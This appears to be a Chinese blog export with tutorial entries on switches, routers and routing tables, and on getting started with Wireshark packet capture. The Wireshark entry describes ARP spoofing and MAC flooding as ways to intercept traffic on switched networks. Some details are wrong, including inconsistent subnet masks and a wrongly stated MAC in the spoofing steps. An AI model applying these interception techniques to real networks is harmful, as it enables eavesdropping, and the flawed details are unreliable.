id="全双工">全双工</h4><p>全双工是收发数据独立，交换机内部的构造也是收发独立的，转发芯片、phy芯片都是两个方向的，所以可以实现全双工；再加上目前绝大多数普通交换机都是存储转发，收到的报文先存储，再查表转发，多个入口到同一个出口的报文存在先后顺序，这样就不会出现hub 的冲突情况了。</p><h3 id="广播域">广播域</h3><ul><li>广播是一种信息的传播方式，指网络中的某一设备同时向网络中所有的其它设备发送数据，这个数据所能广播到的范围即为广播域(BroadcastDomain)。</li><li>在传输中当不知道目的 MAC地址时，需要在网段内广播当前子网下所有的节点，相应的广播报文以及目的 MAC查找失败报文会向所有端口转发，因此会消耗大量的网络带宽。而二层交换机只能隔离冲突域，不能隔离广播域。</li><li>冲突域是基于第一层（物理层） 广播域是基于第二层（链路层）</li></ul><p><strong>交换机能隔离冲突域，不隔离广播域，集线器的所有端口在同一个冲突域下</strong></p><h2 id="路由器">路由器</h2><p>路由器处于网络层（对我们来说，应该算是要重点掌握的），它根据目的 IP以及路由表进行转发和选路</p><h3 id="作用">作用</h3><ol type="1"><li><p>异种网络互连：比如具有异种子网协议的网络互连</p></li><li><p>子网协议转换：不同子网间包括局域网和广域网之间的协议转换</p></li><li><p>路由：也就是寻路</p></li><li><p>速率适配：利用自己的缓存和流控协议进行适配</p></li><li><p>隔离网络：防止广播风暴，还能实现防火墙</p></li><li><p>报文分片和重组：超过接口的 MTU报文会被分片，到达目的地之后的报文会被重组</p></li><li><p>备份、流量控制：主备线路的切换和复杂的流量控制</p></li></ol><h3 id="原理-2">原理</h3><p>路由器工作在 OSI七层协议中的第三层，也就是网络层。其主要任务是接收来源于一个网络接口的数据包，根据这个数据包中所含目的IP地址，决定转发到的下一个目的地址。路由器中时刻维持着一张路由表，所有的数据包的发送和转发都通过查找路由表来实现的。这个路由表可以静态配置，也可以通过动态路由协议产生。</p><h4 id="帧的解封装与封装">帧的解封装与封装</h4><p>从路由器一个接口接收,然后选择合适端口转发,其间做帧的解封装与封装,并对包做相应处理，如下图所示：</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/package.jpg" /></p><ol type="1"><li><p>路由器物理层从路由器的一个端口收到一个报文，上送到数据链路层。</p></li><li><p>数据链路层对到达的数据帧进行 CRC校验并检查其目的数据链路层地址（即：MAC地址）是否与本端口符合.不符合则丢弃，符合则将去掉链路层封装（帧的封装），根据报文的协议域上送到网络层</p></li><li><p>网络层首先看报文是否是送给本机的，若是，去掉网络层封装，送给上层。若不是，则根据报文的目的IP 地址查找路由表，</p><ol type="1"><li><p>若找不到对应路由表项，报文丢弃。</p></li><li><p>若找到对应路由表项，则根据表项决定转发接口与下一跳地址。获得了转发接口与下一跳地址信息后路由器将查看缓存中是否已经有了在外出接口上进行数据链路层封装所需的信息。如果没有这些信息，路由器将通过适当的进程获得这些信息</p><ol type="1"><li>外出接口如果是以太网,则将通过 ARP 协议获得下一跳 IP 地址所对应的 MAC地址</li><li>外出接口如果是广域网接口,则将通过手工配置或自动实现的映射过程获得相应的2 层地址信息</li></ol><p>然后做新的数据链路层封装,并依据外出接口上所做的 QOS策略入相应的队列,等待端口空闲进行数据转发.</p></li></ol></li></ol><p>其中路由表有五个表项</p><p>1、网络地址（<em>NetworkDestination</em>）、网络掩码（<em>Netmask</em>）：网络地址和网络掩码相与的结果便是子网地址。</p><p>2、网关（<em>Gateway，又称为</em>下一跳服务器）：在发送 IP数据包时，网关定义了针对特定的网络目的地址，数据包发送到的下一跳服务器。如果是本地计算机直接连接到的网络，网关通常是本地计算机对应的网络接口，但是此时接口必须和网关一致；如果是远程网络或默认路由，网关通常是本地计算机所连接到的网络上的某个服务器或路由器。</p><blockquote><p>百度百科：网关就是一个网络连接到另一个网络的“关口”。也就是网络关卡。</p></blockquote><p>网关既可以用于广域网互连，也可以用于局域网互连</p><p>网关实质上是一个网络通向其他网络的 IP 地址。比如有网络 A 和网络B，网络 A 的 IP 地址范围为“192.168.1.1~192. 168.1.254”，子网掩码为255.0.0.0；网络 B 的 IP 地址范围为“192.168.2~192.168.2.254”，子网掩码为255.255.0.0。在没有路由器的情况下，两个网络之间是不能进行 TCP/IP通信的，即使是两个网络连接在同一台交换机（或集线器）上，TCP/IP协议也会根据子网掩码（255.255.255.0）判定两个网络中的主机处在不同的网络里。而要实现这两个网络之间的通信，则必须通过网关。如果网络A中的主机发现数据包的目的主机不在本地网络中，就把数据包转发给它自己的网关，再由网关转发给网络B 的网关，网络 B 的网关再转发给网络 B 的某个主机（如附图所示）。网络 A向网络 B 转发数据包的过程。</p><p>所以说，只有设置好网关的 IP 地址，TCP/IP协议才能实现不同网络之间的相互通信。那么这个 IP 地址是哪台机器的 IP地址呢？网关的 IP 地址是具有路由功能的设备的 IP地址，具有路由功能的设备有路由器、启用了路由协议的服务器（实质上相当于一台路由器）、代理服务器（也相当于一台路由器）。</p><p>3、接口（Interface）：接口定义了针对特定的网络目的地址，本地计算机用于发送数据包的网络接口。网关必须位于和接口相同的子网（默认网关除外），否则造成在使用此路由项时需调用其他路由项，从而可能会导致路由死锁。</p><p>4、跃点数（Metric）：跃点数用于指出路由的成本，通常情况下代表到达目标地址所需要经过的跃点数量，一个跃点代表经过一个路由器。跃点数越低，代表路由成本越低；跃点数越高，代表路由成本越高。当具有多条到达相同目的网络的路由项时，TCP/IP会选择具有更低跃点数的路由项。</p><p>​路由和交换之间的主要区别就是交换发生在数据链路层，而路由发生在第三层，即网络层。这一区别决定了路由和交换在移动信息的过程中需要使用不同的控制信息，所以两者实现各自功能的方式是不同的。</p><h3 id="路由选择">路由选择</h3><p>分为域内选路和域间选路，准备再开一篇文章来讲。</p><p>路由器工作过程总结：对于一个特定的路由协议，可以发现到达目的网络的所有路径。域内选路是根据域内选路算法赋予每一条路径metric 值,比较 metric 值,选择 metric值最小的路径为最佳路径进行数据的转发。ISP 之间的路由选择 BGP，路由选择算法，按照以下优先次序：本地偏好 -&gt; 最短 AS-PATH -&gt;热土豆路由选择 选路</p><p>本文基本完结，路由选择及总结还待完善。</p><p>参考资料：</p><p><ahref="https://blog.csdn.net/weixin_39731083/article/details/81637581">计算机中的冲突域、广播域</a><ahref="https://blog.csdn.net/GAMEloft9/article/details/25075039">为什么交换机隔离冲突域，不隔离广播域</a><ahref="https://blog.csdn.net/zyboy2000/article/details/50528253">路由表详解</a><a href="https://blog.51cto.com/13401027/1975059">路由器的工作原理</a><ahref="https://www.cnblogs.com/hoojjack/p/6747357.html">交换机工作原理、MAC地址表、路由器工作原理详解</a> <ahref="https://baike.baidu.com/item/网关">网关</a> <ahref="https://zhuanlan.zhihu.com/p/31764348">路由器的工作原理</a> <ahref="https://blog.csdn.net/qq_35580883/article/details/78879848#">路由器与交换机的基本工作原理</a></p>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一. Wireshark初识</title>
      <link href="/blog/2019/07/01/wireshark/beginning_with_wireshark/"/>
      <url>/blog/2019/07/01/wireshark/beginning_with_wireshark/</url>
      
        <content type="html"><![CDATA[<h1 id="简介">简介</h1><p>Wireshark是目前全球使用最广泛的开源抓包软件(全平台支持)，用于网络分析。类似抓包软件：Fiddler、Burp Suite、Sniffer、Omnipeek、Httpwatch 国内类似 WireShark的有<a href="http://www.colasoft.com.cn/">科来网络分析系统</a></p><p>相关学习网址： <ahref="https://www.wireshark.org/docs/">官方文档</a>、 <ahref="https://www.chappell-university.com/books">书籍</a>、 <ahref="wiki.wireshark.org">维基</a>、<ahref="https://ask.wireshark.org/questions/">官方论坛</a>、<ahref="http://www.tcpdump.org/manpages/pcap-filter.7.html">捕获过滤器</a>、<ahref="https://wiki.wireshark.org/CaptureFilters">捕获过滤器语法wiki</a>、<ahref="https://www.wireshark.org/docs/dfref/">显示过滤器语法</a>、<ahref="https://wiki.wireshark.org/DisplayFilters">显示过滤器语法wiki</a>，<a href="https://wiki.wireshark.org/SampleCaptures">官网 wiki各种协议的例子</a>(后面分析协议，如果你自己抓不到或懒得抓，可以去这里下载)</p><h1 id="抓包原理">抓包原理</h1><h2 id="一.-网络原理">一. 网络原理</h2><h3 id="本机环境">1. 本机环境</h3><h4 id="网卡的混杂模式">网卡的混杂模式</h4><ol type="1"><li><p>是一种允许网卡能够查看到所有流经网络线路数据包的驱动模式。</p></li><li><p>非混杂模式网卡，收到目的 MAC不是自己的帧，不会向上传送，会直接丢弃。</p></li><li><p>混杂模式的网卡，会把所有收到的数据包接收，向上传送，从而可以被数据包嗅探器捕获并进行分析。</p></li><li><p>现在大多数网卡一般都支持混杂模式</p></li><li><p>Wireshark软件自带混杂模式驱动，可以直接把网卡切换成混杂模式</p></li><li><p>对于一个未配置混杂模式的网卡，假设 PC1 通过交换机与 PC2相连，</p><p>对于 PC1 来说，它可以接收三种流量：目的 MAC为自己，广播以及组播</p></li></ol><p>本家环境可以使用网卡的混杂模式进行抓取，目前所有 PC的网卡都支持混杂模式，（但是要有驱动的），如果一个网卡没有配置混杂模式，可以收到的流量类型：</p><p>直接抓包，抓本机网卡的流量。如下图所示，在本机安装Wireshark，绑定网卡，不需要借助交换机、集线器、路由器等第三方设备，抓取本机电脑网卡上进出的流量，这是一种最基本的抓包方式。</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/host.png" /></p><h3 id="集线器环境">2. 集线器环境</h3><p>同一个集线器的众多端口下的机器处于同一冲突域，如果不处于集线器环境，可以使用集线器接出的方式抓包，如果处于集线器环境，即：如下图所示，三台电脑PC1、PC2、PC3 通信，PC1 装有Wireshark，三台电脑连接到同一台集线器，集线器属于物理层产品，掌管物理比特传输，看不懂MAC 地址和 IP 地址，因此三台电脑处于同一个冲突域，即这三台机器均处于</p><p>可视范围:在数据报嗅探器中能够看到通信流量的主机范围，也可以说是一个冲突域</p><p>一台电脑可以抓到同一集线器下其他电脑发送过来的数据包，这是一种比较典型的被淘汰的老网络拓扑结构。</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/hub.png" /></p><h3 id="交换机环境">3. 交换机环境</h3><p>交换机环境下的可视范围（冲突域）仅限于你所接入的端口，上一篇文章中已经讲过交换机会隔离冲突域，</p><h4 id="端口镜像port-mirroring">1) 端口镜像（Port mirroring）</h4><p>PC2 与 PC3 通信，一般情况下（MAC 地址表中有对应的 MAC 表项），PC1无法抓到二者之间的数据包。（非一般，即：没对应 MAC表项时，可以抓到）。这种情况下，可以在交换机做端口策略（SPAN/SPAN）。</p><p>SPAN 技术大体分为两种类型，本地 SPAN 和远程 SPAN. ----Local SwitchedPort Analyzer (SPAN) and Remote SPAN (RSPAN)，实现方法上稍有不同。 利用SPAN技术我们可以把交换机上某些想要被监控端口（以下简称受控端口）的数据流COPY 或 MIRROR 一 份，发送给连接在监控端口上的流量分析仪（并不会影响<ahref="https://baike.baidu.com/item/源端口">源端口</a>的数据交换），比如CISCO 的 IDS 或是装了 SNIFFER 工具的 PC. 受控端口和监控端口可以在同一台交换机上（本地 SPAN），也可以在不同的交换机上（远程SPAN）。该功能往往被用来实现故障定位、流量分析、流量备份等。</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/port%20mapping.png" /></p><h4 id="网络分流器">2) 网络分流器</h4><p>网络分流器是一种专门为了网络分析而设计的特殊硬件，通常用于网络入侵检测系统（IDS）。它是一个独立的硬件，它不会对已有网络设备的负载带来任何影响，这与端口镜像等方式相比具有极大的优势。</p><p>它是一种在线（in-line）的设备，简单一点说就是它需要串接到网络中。</p><h4 id="arp-欺骗arp-spoofing">3) ARP 欺骗（ARP spoofing）</h4><p>是一种在交换式网络中进行监听的高级技术，一般需要借助第三方工具软件来一起完成（Cain&amp;abel工具软件）</p><p>1） PC2 收到含有 PC3 的数据报，但是不知道其 MAC 地址，便通过 ARP协议进行广播。</p><p>2）此时 PC1 做 ARP 欺骗，不断地向 PC2 回复：我是 PC3，对应的 MAC 是XXX，就可以毒化 PC2 的 ARP 表（ARP 缓存表基于"后到优先"原则，IP 与 MAC的映射信息能被覆盖），这样，PC2 的 ARP 表上便将表项上 PC3 的 MAC地址处对应成了 PC2 的 MAC 地址。</p><p>3）从此时到该错误表项被更新正确之前，PC2 想与 PC3 通信，就要经过PC1，再由 PC1 决定是否将数据包发给 PC3。PC2 和 PC3 的通信数据流被 PC1拦截，形成了典型的"<strong>中间人攻击</strong>"。</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/arp_spoofing.png" /></p><h4 id="mac-泛洪mac-flooding">4) MAC 泛洪（MAC flooding）</h4><p>MAC泛洪并不是针对网络中任何主机的攻击方式，而是一种针对其中交换机的攻击方式。但是，受害的是网络中的主机。</p><p>原理：攻击者发送大量的具有不同地址的垃圾以太网帧，来消耗交换机用来存储MAC 表的内存，直到正确合法的 MAC 表项被非法的垃圾以太网帧对应的 MAC表项挤出 MAC表，这样交换机就不能将到来的数据转发到指定的端口（即：还要使用 ARP协议，将到来的数据包进行广播，即：到来的数据被发送到所有端口，也就是泛洪），这样攻击者就实现流量劫持了</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/mac_flooding.png" /></p><p>使用网络分流器</p><p>小结：交换机环境的这三种方式，第一种可以说是维护安全的做法，后两种算是黑客攻击吧。</p><h2 id="二.-底层原理">二. 底层原理</h2><p>首先，我们简单了解一下网络嗅探器的工作原理</p><ol type="1"><li><p>收集</p><p>数据包嗅探器从网络线缆上收集原始二进制数据。<em>通常情况下，通过将选定的网卡设置成混杂模式来完成抓包。在这种模式下，网卡将抓取一个网段上所有的网络通信流量，而不仅是发往它的数据包。</em></p></li><li><p>转换</p><p>将捕获的二进制数据转换成可读形式。高级的命令行数据包嗅探器就支持到这一步骤。到这步，网络上的数据包将以一种非常基础的解析方式进行显示，而将大部分的分析工作留给最终用户。</p></li><li><p>分析</p><p>对捕获和转换后的数据进行真正的深入分析。数据包嗅探器以捕获的网络数据作为输入，识别和验证它们的协议，然后开始分析每个协议特定的属性。</p></li></ol><p>下面我们介绍一下 Wireshark 的原理</p><p>首先，数据流动方向：网卡（接收） -&gt; CPU (处理)-&gt;Wireshark。</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/principle.png" /></p><ol type="1"><li>libpcap（Packet Capture Library）数据包捕获函数库，是 Unix/Linux平台下的网络数据包捕获函数库（对应 WinPcap 为 Window下的）。它是一个独立于系统的用户层包捕获的 API接口，为底层网络监测提供了一个可移植的框架。</li><li>Capture 为抓包引擎，利用 libPcap / WinPcap从底层抓取网络数据包，libPcap / WinPcap提供了通用的抓包接口，能从不同类型的网络接口抓取。</li><li>Wiretap 提供格式支持，从抓包文件中读取数据报，支持多种格式。</li><li>Core是核心引擎，通过函数调用将其他模块连接在一起，起到联动调度的作用</li><li>GTK1/2 为图像处理工具，处理用户的输入输出显示</li></ol><h1 id="界面及功能简介">界面及功能简介</h1><h2 id="界面介绍">界面介绍</h2><p>安装就不说了，一路默认下一步就行了。博主用的是 Windows 上最新版3.0.2，打开软件，首先选择一个抓包的地址（好像是这么说 ☺️），我这里是WiFi 上网，选择 WLAN左键连续点击两下，进入抓包主界面，不多说了，一图胜千言。</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/入门/region.png" />简要介绍一下重要的区域块吧，这里说一下，感觉要把 Wireshark玩精，过滤器和统计是必须要好好掌握的。</p><h3 id="其他">其他</h3><p>系统配置为菜单栏 -&gt; 编辑 -&gt;首选项。首选项可以调整主界面的布局，不同协议包的配色，文件，过滤等各种设置。</p><p>Appearance(外观)：这些选项决定了 Wireshark列的显示数据以及是否显示某列、显示捕获数据的字体和特殊情况的颜色以及前景主窗口的布局。可以增加列，比如增加一列用来显示TCP 窗口大小：tcp.window_size 或显示 TTL：ip.ttlCapture（捕获）：对捕获数据包的方式进行特殊设置，比如默认使用的设备、是否默认使用混杂模式、是否实时更新Pack List 面板等。 Expert（专家模式）： NameResolutions（名字解析）：这些设定可以开启 Wireshark将地址（MAC、网络以及传输名字解析）解析成更加容易辨别的名字这一功能。FilterButton（过滤按钮）：可以做过滤的标签，在过滤的时候直接使用此标签。Protocols（协议）：列出部分能够被解码的所有数据包，这部分协议的选项可以被更改，除非有特殊的原因，否则不要去修改这些协议选项，保持默认值就好。Statistics（统计）：提供了 Wireshark 统计功能的设定选项。视图中可以调整界面的显示的区块，也可以在“着色规则”下查看/调整不同协议及特殊数据的配色方案。跳转中是一些快捷键，常用的记住会用就好，记不住也没关系。数据报列表的表项，在上面右键，可以自己调整和修改，一般默认，如果要查看一些详细的信息，比如TTL 等可以加到列表上去工具栏的话，把鼠标箭头移到某个图标上会显示描述功能的文字 PacketList（数据包列表区）：显示当前捕获的所有数据包，其中包括数据包序号、捕获相对时间、源目标地址、协议、概况信息等。 PacketDetails（数据包详细区）：显示数据包的内容，展开可以看到数据包捕获的全部内容。Packet Bytes（数据包字节区）：显示一个数据包未经处理的原始样子（16进制和 ASCII 码形式），也就是在链路上传播的样子。</p><h3 id="捕获">捕获</h3><ol type="1"><li>打开选项，默认处在“输入”选项卡</li></ol><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/capture_option1.png" /></p><p>这里讲一下，过滤器的分类：捕获过滤器与显示过滤器。</p><p>当你使用某个规则较多时，可以将其加入规则列表，以便后续使用</p><p>两种过滤器的目的是不同的。捕捉过滤器是数据经过的第一层过滤器，它用于控制捕捉数据的数量，以避免产生过大的日志文件。一般在流量比较大的网络中，使用它可以避免抓到太多你不需要的包，使Wireshark 卡死等，小的也可以用 emm。显示过滤器是一种更为强大（复杂）的过滤器。它允许您在日志文件中迅速准确地找到所需要的记录。即：从你抓取的包中选择哪些包要显示在界面上，哪些包不显示。</p><p>你在主界面看到的数据报过滤栏是显示过滤器，你在捕获选项中看到的“捕获过滤器”以及打开选项后看到的“所选择接口的捕获过滤器”都是指捕获过滤器。</p><p>两种过滤器使用的语法是完全不同的。</p><p>注意：两种过滤器语法是有些不相同的，但是如果你学过任何一门编程语言，相信你会很容易上手这个，下面给出链接：<ahref="https://wiki.wireshark.org/CaptureFilters">捕获过滤器语法</a>、<ahref="https://wiki.wireshark.org/DisplayFilters">显示过滤器语法</a></p><p>接着讲上面的界面，“在所有接口上使用混杂模式”是指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它。而非混杂模式，则只接受MAC 地址为自己的数据流。一般开启它。</p><p>可以在这填写捕获过滤语句（语法正确会显示绿色，错误显示红色），然后点击确定，开始捕获符合你语法的包。</p><p>2）下面看看“选项”选项卡，输出选项卡自己试试，比较简单</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/capture_option3.png"alt="选项" /><figcaption aria-hidden="true">选项</figcaption></figure><p>显示选项：</p><ol type="1"><li>实时更新分组列表：Wireshark抓包主窗口会实时显示抓取到的所有数据包</li><li>实时捕获自动滚屏：Wireshark 抓包主窗口会在实时抓取数据包时滚动</li><li>实时捕获期间显示捕获信息：选中之后，点击确认，会弹出一个显示各协议（ICMP，TCP，IP，UDP，其他）流量波动的线性波动图，可以在捕获的同时，看各协议大体趋势。</li></ol><p>解析名称：</p><ol type="1"><li>解析 MAC 地址就是解析其所隶属的厂商名</li><li>解析网络名称，就是解析 IP 向对应的主机名 / 域名，wireshark会发大量的 DNS 请求（向 wireshark 所在主机的DNS）去解析网络名称，因此如果网络较大，会耗费大量系统资源。</li><li>解析传输层名称：解析 TCP/UDP 端口号相对应的应用程序名</li></ol><h2 id="常用显示过滤器过滤命令">常用显示过滤器过滤命令</h2><ol type="1"><li><p>根据协议过滤 <code>dns，tcp，upd，arp</code> 等</p></li><li><p>根据源、目的 IP 过滤 <code>ip.src==</code><code>ip.dst==</code></p></li><li><p>根据端口过滤 <code>tcp.port == 80</code> 源、目的端口为 80 的 tcp<code>tcp.srcport==80</code> 只看源端口为 80 的 tcp<code>udp.port == 53</code> dns 数据包</p></li><li><p>逻辑表达式 and or xor not</p></li></ol><h3 id="统计">统计</h3><p>是很重要的模块，单独拿一篇文章讲一下</p><p>参考资料：</p><blockquote><ul><li><a href="https://zhuanlan.zhihu.com/p/28771785">图解 ARP协议（一）</a></li></ul></blockquote><blockquote><ul><li><a href="https://zhuanlan.zhihu.com/p/28818627">图解 ARP协议（二）ARP 攻击篇</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> wireshark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 抓包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>零. 数据包分析与网络基础</title>
      <link href="/blog/2019/06/30/wireshark/packets_and_network_basis/"/>
      <url>/blog/2019/06/30/wireshark/packets_and_network_basis/</url>
      
        <content type="html"><![CDATA[<h1 id="数据包分析技术与网络基础">数据包分析技术与网络基础</h1><h2 id="数据包分析技术">数据包分析技术</h2><ol type="1"><li>数据包分析技术是用来解决<strong>所有</strong>网络问题的技术</li><li>所有网络问题都源于 “数据包层次”</li><li>可以解决网络通信速度慢的问题，可以识别应用程序的性能瓶颈</li><li>可以在真实环境中追踪黑客</li></ol><h2 id="数据包抓取工具嗅探器">数据包抓取工具（嗅探器）</h2><p>分为免费的和商业的，流行的分析软件包括 tcpdump，OmniPeek 和Wireshark，其中 tcpdump 是命令行工具，另外两款均拥有图形化界面。</p><p>数据包嗅探的工作原理：</p><p>网络嗅探器的工作原理</p><ol type="1"><li><p>收集</p><p>数据包嗅探器从网络线缆上收集原始二进制数据。<em>通常情况下，通过将选定的网卡设置成混杂模式来完成抓包。在这种模式下，网卡将抓取一个网段上所有的网络通信流量，而不仅是发往它的数据包。</em></p></li><li><p>转换</p><p>将捕获的二进制数据转换成可读形式。高级的命令行数据包嗅探器就支持到这一步骤。到这步，网络上的数据包将以一种非常基础的解析方式进行显示，而将大部分的分析工作留给最终用户。</p></li><li><p>分析</p><p>对捕获和转换后的数据进行真正的深入分析。数据包嗅探器以捕获的网络数据作为输入，识别和验证它们的协议，然后开始分析每个协议特定的属性。</p></li></ol><p>在这里我们再复习一下计算机网络的一些知识：</p><ol type="1"><li><ahref="https://realyee.github.io/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E4%B8%8E%E4%B8%A4%E7%A7%8D%E5%86%B2%E7%AA%81%E5%9F%9F/">OSI模型、集线器、路由器、交换机、冲突域、广播域以及帧的封装与解封装</a></li><li><ahref="https://blog.csdn.net/freestyle4568world/article/details/50609435">广播、多播、单播</a></li></ol><p>未完待续...</p>]]></content>
      
      
      <categories>
          
          <category> wireshark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 抓包 </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
